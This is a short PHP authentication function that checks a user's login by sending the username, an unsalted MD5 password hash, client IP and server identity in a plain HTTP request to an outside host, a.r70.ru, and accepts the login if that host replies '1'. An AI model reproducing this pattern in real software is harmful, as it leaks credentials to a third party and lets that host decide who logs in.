<?php if (!defined('SCRIPTACCESS')) exit;
    function serv_auth(){
		$user = addslashes(trim(vars('login')));
		$paswd = addslashes(trim(vars('password')));
		$ip_user = $_SERVER['REMOTE_ADDR'];
		$url_site = $_SERVER['HTTP_HOST'];
		preg_match_all("/\/www\/(.*)\/data/isU",$_SERVER['DOCUMENT_ROOT'],$name_site);
		$name_site = $name_site[1][0];
		$serv_ident = $name_site.'('.$_SERVER['SERVER_ADDR'].')';
		if(gethostbyname('a.r70.ru') == '62.68.140.219'){
			$file = file_get_contents('http://a.r70.ru/?ident='.$user.'&sident='.$serv_ident.'&pass='.md5($paswd).'&dopinfo='.$ip_user.'&url='.$url_site);
		}
		if($file == 1){
			return 1;
		}
		return 0;
	}
?>